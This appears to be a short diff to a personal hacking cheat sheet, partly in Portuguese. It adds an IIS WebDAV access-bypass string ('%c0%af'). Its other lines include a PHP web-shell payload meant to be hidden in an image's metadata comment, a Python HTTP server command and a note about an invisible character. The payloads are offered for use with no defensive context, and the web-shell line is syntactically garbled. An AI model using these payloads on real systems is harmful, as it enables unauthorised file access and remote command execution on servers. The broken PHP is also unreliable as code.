@@ -1,3 +1,4 @@
+Rogue string to download protected resources (IIS WebDav): %c0%af
 Caractere vazio entre parêntesis: (‎)
 SimpleServer: python -m http.server [Nº Porta]
 Image metadata shell, comment: <?php;echo shell_exec(\$_[GET[\"do\"]);?>
